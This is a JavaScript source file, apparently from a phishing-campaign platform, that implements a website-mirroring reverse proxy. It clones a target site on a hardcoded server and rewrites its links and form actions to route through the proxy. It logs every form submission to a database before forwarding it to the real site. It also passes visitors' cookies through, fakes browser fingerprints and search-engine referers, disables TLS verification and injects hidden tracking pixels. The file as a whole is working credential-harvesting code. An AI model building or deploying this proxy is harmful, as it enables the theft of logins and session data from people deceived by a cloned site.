const axios = require('axios');
const cheerio = require('cheerio');
const db = require('../database');
const crypto = require('crypto');

class WebsiteMirroringService {
  constructor() {
    this.activeSessions = new Map(); // sessionToken -> session data
    this.mirrorRoutes = new Map(); // path -> session data
  }

  /**
   * Create a new website mirroring session for a campaign
   * @param {number} campaignId - Campaign ID
   * @param {string} targetUrl - URL to mirror
   * @returns {Promise<Object>} Mirror session details
   */
  async createMirrorSession(campaignId, targetUrl) {
    try {
      // Generate unique session token (like iksduhfgh_7898dmndfikd)
      const sessionToken = crypto.randomBytes(16).toString('hex');
      
      // Normalize target URL
      const normalizedUrl = this.normalizeUrl(targetUrl);
      
      // Create session in database
      const sessionId = await new Promise((resolve, reject) => {
        db.run(
          `INSERT INTO WebsiteMirroringSessions 
           (campaign_id, target_url, session_token, status, proxy_port) 
           VALUES (?, ?, ?, ?, ?)`,
          [campaignId, normalizedUrl, sessionToken, 'active', 5000],
          function(err) {
            if (err) reject(err);
            else resolve(this.lastID);
          }
        );
      });

      // Create proxy URL using path-based routing on port 5000
      const proxyUrl = `http://147.93.87.182:5000/${sessionToken}`;
      
      // Store session info
      const sessionData = {
        sessionId,
        campaignId,
        targetUrl: normalizedUrl,
        sessionToken,
        proxyUrl,
        startTime: new Date()
      };
      
      this.activeSessions.set(sessionToken, sessionData);
      this.mirrorRoutes.set(`/${sessionToken}`, sessionData);

      console.log(`Website mirroring session created: ${proxyUrl} -> ${normalizedUrl}`);
      
      return {
        sessionId,
        sessionToken,
        proxyUrl,
        targetUrl: normalizedUrl,
        proxyPort: 5000 // Always use port 5000
      };
    } catch (error) {
      console.error('Error creating mirror session:', error);
      throw error;
    }
  }

  /**
   * Handle mirroring request for a specific session
   * @param {string} sessionToken - The session token from URL path
   * @param {object} req - Express request object
   * @param {object} res - Express response object
   */
  async handleMirrorRequest(sessionToken, req, res) {
    try {
      const session = this.activeSessions.get(sessionToken);
      
      if (!session) {
        // Session not in memory, try to load it from database
        const dbSession = await new Promise((resolve, reject) => {
          db.get(
            `SELECT * FROM WebsiteMirroringSessions 
             WHERE session_token = ? AND status = 'active'`,
            [sessionToken],
            (err, row) => {
              if (err) reject(err);
              else resolve(row);
            }
          );
        });
        
        if (dbSession) {
          // Create session in memory
          this.activeSessions.set(sessionToken, {
            sessionId: dbSession.id,
            campaignId: dbSession.campaign_id,
            targetUrl: dbSession.target_url,
            sessionToken,
            proxyUrl: `http://147.93.87.182:5000/${sessionToken}`,
            startTime: new Date(dbSession.created_at)
          });
          
          // Use newly created session
          return this.handleMirrorRequest(sessionToken, req, res);
        }
        
        return res.status(404).send('Mirror session not found or expired');
      }

      // Track the access
      await this.trackAccess(session.sessionId, req);

      // Get the target URL
      const targetUrl = session.targetUrl;
      let requestPath = req.path.replace(`/${sessionToken}`, '') || '/';
      const queryString = req.url.includes('?') ? req.url.split('?')[1] : '';
      
      // Remove tracking parameters from forwarded request
      let cleanQuery = '';
      if (queryString) {
        const params = new URLSearchParams(queryString);
        params.delete('_fstrike_track');
        cleanQuery = params.toString();
      }
      
      // Build full target URL
      let fullTargetUrl = targetUrl + requestPath;
      if (cleanQuery) {
        fullTargetUrl += '?' + cleanQuery;
      }

      console.log(`Mirroring request: ${req.method} ${req.originalUrl} -> ${fullTargetUrl}`);

      // Handle form submissions
      if (req.method === 'POST') {
        return this.handleFormSubmission(session, req, res, fullTargetUrl);
      }
      
      // Create a random fingerprint for each request
      const browserVersions = [
        'Chrome/121.0.0.0',
        'Chrome/122.0.0.0',
        'Chrome/123.0.0.0'
      ];
      const randomBrowser = browserVersions[Math.floor(Math.random() * browserVersions.length)];
      
      // Determine if we should use a referrer
      let referer = undefined;
      if (req.headers.referer) {
        // If user has a referer, use it but modify for our proxy
        const refererUrl = new URL(req.headers.referer);
        if (refererUrl.pathname.includes(`/${sessionToken}`)) {
          // This is an internal referer, translate it to the target site
          const refPath = refererUrl.pathname.replace(`/${sessionToken}`, '');
          referer = `${targetUrl}${refPath}`;
        }
      } else if (Math.random() > 0.5) {
        // Sometimes include a referer from a search engine
        const searchReferers = [
          'https://www.google.com/',
          'https://www.bing.com/',
          'https://search.yahoo.com/'
        ];
        referer = searchReferers[Math.floor(Math.random() * searchReferers.length)];
      }

      // Calculate hostname from the target URL
      const targetHostname = new URL(fullTargetUrl).hostname;

      // Make request to target website with improved headers
      const response = await axios({
        method: req.method,
        url: fullTargetUrl,
        headers: {
          'User-Agent': `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) ${randomBrowser} Safari/537.36`,
          'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
          'Accept-Language': 'en-US,en;q=0.9',
          'Accept-Encoding': 'gzip, deflate, br',
          'Sec-Ch-Ua': '"Not A(Brand";v="99", "Google Chrome";v="121", "Chromium";v="121"',
          'Sec-Ch-Ua-Mobile': '?0',
          'Sec-Ch-Ua-Platform': '"Windows"',
          'Sec-Fetch-Dest': 'document',
          'Sec-Fetch-Mode': 'navigate',
          'Sec-Fetch-Site': referer ? 'cross-site' : 'none',
          'Sec-Fetch-User': '?1',
          'Upgrade-Insecure-Requests': '1',
          'Cache-Control': 'max-age=0',
          'Host': targetHostname,
          'Connection': 'keep-alive',
          'DNT': '1',
          ...(referer ? {'Referer': referer} : {}),
          ...(req.headers.cookie ? {'Cookie': req.headers.cookie} : {})
        },
        responseType: 'arraybuffer',
        maxRedirects: 5,
        timeout: 15000,
        decompress: true,
        httpsAgent: new (require('https').Agent)({
          rejectUnauthorized: false,
          keepAlive: true
        })
      });

      // Set response headers
      Object.keys(response.headers).forEach(key => {
        if (!['content-encoding', 'content-length', 'transfer-encoding', 'connection'].includes(key.toLowerCase())) {
          res.setHeader(key, response.headers[key]);
        }
      });

      res.status(response.status);

      // Modify HTML content if it's HTML
      const contentType = response.headers['content-type'] || '';
      if (contentType.includes('text/html')) {
        const html = response.data.toString('utf-8');
        const modifiedHtml = this.modifyHtmlContent(html, sessionToken, targetUrl, req);
        res.send(modifiedHtml);
      } else {
        res.send(response.data);
      }

    } catch (error) {
      console.error('Error handling mirror request:', error);
      
      // Provide more user-friendly error message
      let errorMessage = 'Error loading mirrored content';
      
      if (error.response) {
        const status = error.response.status;
        if (status === 400) {
          errorMessage = `The target site (${session?.targetUrl || 'unknown'}) rejected our request. This site might have bot protection measures in place.`;
        } else if (status === 403) {
          errorMessage = `The target site (${session?.targetUrl || 'unknown'}) has denied access. This site may be blocking requests from our server.`;
        } else if (status === 404) {
          errorMessage = `The requested page was not found on the target site (${session?.targetUrl || 'unknown'}).`;
        } else if (status >= 500) {
          errorMessage = `The target site (${session?.targetUrl || 'unknown'}) is experiencing technical difficulties.`;
        } else {
          errorMessage = `Error loading content: ${error.response.statusText} (${status})`;
        }
        res.status(error.response.status).send(`
          <html>
            <head>
              <title>Mirroring Error</title>
              <style>
                body { font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px; }
                h1 { color: #d9534f; }
                .message { background-color: #f9f9f9; padding: 15px; border-radius: 5px; }
                .try-again { margin-top: 20px; }
              </style>
            </head>
            <body>
              <h1>Mirroring Error</h1>
              <div class="message">
                <p>${errorMessage}</p>
                <p>This could be due to:</p>
                <ul>
                  <li>Bot protection mechanisms on the target site</li>
                  <li>Cloudflare or similar security services blocking our request</li>
                  <li>Geographic restrictions on the content</li>
                </ul>
              </div>
              <div class="try-again">
                <p><a href="javascript:location.reload()">Try again</a> or try a different target URL.</p>
              </div>
            </body>
          </html>
        `);
      } else {
        res.status(500).send(`
          <html>
            <head>
              <title>Mirroring Error</title>
              <style>
                body { font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px; }
                h1 { color: #d9534f; }
                .message { background-color: #f9f9f9; padding: 15px; border-radius: 5px; }
                .try-again { margin-top: 20px; }
              </style>
            </head>
            <body>
              <h1>Mirroring Error</h1>
              <div class="message">
                <p>Error loading mirrored content. The target site may be unavailable or blocking our request.</p>
              </div>
              <div class="try-again">
                <p><a href="javascript:location.reload()">Try again</a> or try a different target URL.</p>
              </div>
            </body>
          </html>
        `);
      }
    }
  }

  /**
   * Handle form submission to mirrored website
   */
  async handleFormSubmission(session, req, res, targetUrl) {
    try {
      console.log('Form submission to mirrored website:', req.body);

      // Store form submission in our database
      const formData = { ...req.body };
      delete formData._fstrike_session; // Remove our tracking field

      // Store in database
      db.run(
        `INSERT INTO FormSubmissions (campaign_id, landing_page_id, form_data, ip_address, user_agent)
         VALUES (?, ?, ?, ?, ?)`,
        [session.campaignId, 0, JSON.stringify(formData), req.ip, req.get('User-Agent')]
      );

      console.log('Form data captured for campaign:', session.campaignId);

      // Forward form submission to target website
      const response = await axios({
        method: 'POST',
        url: targetUrl,
        data: new URLSearchParams(formData),
        headers: {
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
          'Content-Type': 'application/x-www-form-urlencoded',
          'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
          'Accept-Language': 'en-US,en;q=0.5',
          'Referer': session.targetUrl,
          'Origin': new URL(session.targetUrl).origin
        },
        maxRedirects: 0,
        validateStatus: () => true,
        responseType: 'arraybuffer',
        timeout: 15000
      });

      // Handle redirects
      if (response.status >= 300 && response.status < 400 && response.headers.location) {
        const redirectUrl = response.headers.location;
        if (redirectUrl.startsWith('http')) {
          // Absolute redirect - check if it's to the same domain
          const redirectDomain = new URL(redirectUrl).origin;
          if (redirectDomain === new URL(session.targetUrl).origin) {
            // Same domain - redirect through our proxy
            const relativePath = redirectUrl.replace(session.targetUrl, '');
            return res.redirect(response.status, `/${session.sessionToken}${relativePath}`);
          }
        } else {
          // Relative redirect - redirect through our proxy
          return res.redirect(response.status, `/${session.sessionToken}${redirectUrl}`);
        }
      }

      // Return response
      res.status(response.status);
      Object.keys(response.headers).forEach(key => {
        if (!['content-encoding', 'content-length', 'transfer-encoding'].includes(key.toLowerCase())) {
          res.setHeader(key, response.headers[key]);
        }
      });

      if (response.headers['content-type']?.includes('text/html')) {
        const html = response.data.toString('utf-8');
        const modifiedHtml = this.modifyHtmlContent(html, session.sessionToken, session.targetUrl, req);
        res.send(modifiedHtml);
      } else {
        res.send(response.data);
      }

    } catch (error) {
      console.error('Error handling form submission:', error);
      res.status(500).send('Error submitting form');
    }
  }

  /**
   * Modify HTML content to inject tracking and fix relative links
   */
  modifyHtmlContent(html, sessionToken, targetUrl, req) {
    try {
      const $ = cheerio.load(html);
      const baseUrl = new URL(targetUrl);
      const proxyPath = `/${sessionToken}`;

      // Fix relative links and resources
      $('a[href]').each((i, elem) => {
        const href = $(elem).attr('href');
        if (href && !href.startsWith('#') && !href.startsWith('javascript:') && !href.startsWith('mailto:')) {
          if (href.startsWith('http')) {
            // Absolute URL - check if same domain
            try {
              const linkUrl = new URL(href);
              if (linkUrl.origin === baseUrl.origin) {
                // Same domain - route through proxy
                const relativePath = href.replace(baseUrl.origin, '');
                $(elem).attr('href', proxyPath + relativePath);
              }
            } catch (e) {
              // Invalid URL, keep original
            }
          } else {
            // Relative URL - route through proxy
            const absolutePath = href.startsWith('/') ? href : '/' + href;
            $(elem).attr('href', proxyPath + absolutePath);
          }
        }
      });

      // Fix images, CSS, and JS resources
      $('img[src], link[href], script[src]').each((i, elem) => {
        const attr = $(elem).attr('src') || $(elem).attr('href');
        if (attr && !attr.startsWith('http') && !attr.startsWith('//') && !attr.startsWith('data:')) {
          const absolutePath = attr.startsWith('/') ? attr : '/' + attr;
          if ($(elem).attr('src')) {
            $(elem).attr('src', proxyPath + absolutePath);
          } else {
            $(elem).attr('href', proxyPath + absolutePath);
          }
        } else if (attr && attr.startsWith('//')) {
          // Protocol-relative URLs
          if ($(elem).attr('src')) {
            $(elem).attr('src', 'https:' + attr);
          } else {
            $(elem).attr('href', 'https:' + attr);
          }
        }
      });

      // Fix form actions
      $('form').each((i, elem) => {
        const $form = $(elem);
        const action = $form.attr('action');
        
        // Add hidden field to track form submissions
        $form.append(`<input type="hidden" name="_fstrike_session" value="${sessionToken}">`);
        
        if (action) {
          if (action.startsWith('http')) {
            // Absolute URL - check if same domain
            try {
              const actionUrl = new URL(action);
              if (actionUrl.origin === baseUrl.origin) {
                const relativePath = action.replace(baseUrl.origin, '');
                $form.attr('action', proxyPath + relativePath);
              }
            } catch (e) {
              // Invalid URL, keep original
            }
          } else if (!action.startsWith('javascript:')) {
            // Relative URL - route through proxy
            const absolutePath = action.startsWith('/') ? action : '/' + action;
            $form.attr('action', proxyPath + absolutePath);
          }
        } else {
          // No action - defaults to current page
          $form.attr('action', req.originalUrl);
        }
      });

      // Inject tracking pixel for page views
      const trackingPixel = `
        <img src="/api/track-mirror-view/${sessionToken}" 
             style="display:none;width:1px;height:1px;" 
             alt="" />
      `;
      $('body').append(trackingPixel);

      return $.html();
    } catch (error) {
      console.error('Error modifying HTML content:', error);
      return html;
    }
  }

  /**
   * Track access to mirrored content
   */
  async trackAccess(sessionId, req) {
    try {
      const timestamp = new Date().toISOString();
      const ip = req.ip || req.connection.remoteAddress;
      const userAgent = req.get('User-Agent') || '';
      const trackingParam = req.query._fstrike_track;

      // Update last accessed time and increment counter
      db.run(
        `UPDATE WebsiteMirroringSessions 
         SET last_accessed = ?, access_count = access_count + 1 
         WHERE id = ?`,
        [timestamp, sessionId]
      );

      // Log visit with tracking ID if present
      if (trackingParam) {
        console.log(`Mirror access tracked with ID ${trackingParam}: Session ${sessionId}, IP: ${ip}`);
        
        // Check if this corresponds to a tracking pixel
        db.get(
          `SELECT user_email FROM tracking_pixels WHERE id = ?`,
          [trackingParam],
          (err, row) => {
            if (!err && row) {
              console.log(`Mirror access by user: ${row.user_email}`);
              
              // Log the click in link_clicks table
              db.run(
                `INSERT INTO link_clicks (campaign_id, landing_page_id, ip_address, user_agent)
                 VALUES (?, 0, ?, ?)`,
                [sessionId, ip, userAgent]
              );
            }
          }
        );
      } else {
        console.log(`Mirror access tracked: Session ${sessionId}, IP: ${ip}, Path: ${req.path}`);
      }
    } catch (error) {
      console.error('Error tracking access:', error);
    }
  }

  /**
   * Stop a mirroring session
   */
  async stopMirrorSession(sessionId) {
    try {
      // Find session by ID
      let sessionToken = null;
      for (const [token, session] of this.activeSessions.entries()) {
        if (session.sessionId === sessionId) {
          sessionToken = token;
          break;
        }
      }

      if (sessionToken) {
        // Remove from active sessions
        this.activeSessions.delete(sessionToken);
        this.mirrorRoutes.delete(`/${sessionToken}`);
      }

      // Update database
      await new Promise((resolve, reject) => {
        db.run(
          `UPDATE WebsiteMirroringSessions 
           SET status = 'inactive' 
           WHERE id = ?`,
          [sessionId],
          (err) => {
            if (err) reject(err);
            else resolve();
          }
        );
      });

      console.log(`Mirror session ${sessionId} stopped`);
    } catch (error) {
      console.error('Error stopping mirror session:', error);
      throw error;
    }
  }

  /**
   * Get mirroring session details
   */
  async getMirrorSession(campaignId) {
    return new Promise((resolve, reject) => {
      db.get(
        `SELECT * FROM WebsiteMirroringSessions 
         WHERE campaign_id = ? AND status = 'active' 
         ORDER BY created_at DESC LIMIT 1`,
        [campaignId],
        (err, row) => {
          if (err) reject(err);
          else resolve(row);
        }
      );
    });
  }

  /**
   * Helper methods
   */
  normalizeUrl(url) {
    if (!url.startsWith('http://') && !url.startsWith('https://')) {
      url = 'https://' + url;
    }
    return url.endsWith('/') ? url.slice(0, -1) : url;
  }

  /**
   * Clean up inactive sessions
   */
  async cleanupSessions() {
    try {
      // Stop sessions that haven't been accessed in 24 hours
      const cutoffTime = new Date(Date.now() - 24 * 60 * 60 * 1000);
      
      const inactiveSessions = await new Promise((resolve, reject) => {
        db.all(
          `SELECT id FROM WebsiteMirroringSessions 
           WHERE status = 'active' 
           AND (last_accessed IS NULL OR last_accessed < ?)`,
          [cutoffTime.toISOString()],
          (err, rows) => {
            if (err) reject(err);
            else resolve(rows);
          }
        );
      });

      for (const session of inactiveSessions) {
        await this.stopMirrorSession(session.id);
      }

      console.log(`Cleaned up ${inactiveSessions.length} inactive mirroring sessions`);
    } catch (error) {
      console.error('Error cleaning up sessions:', error);
    }
  }
}

module.exports = new WebsiteMirroringService();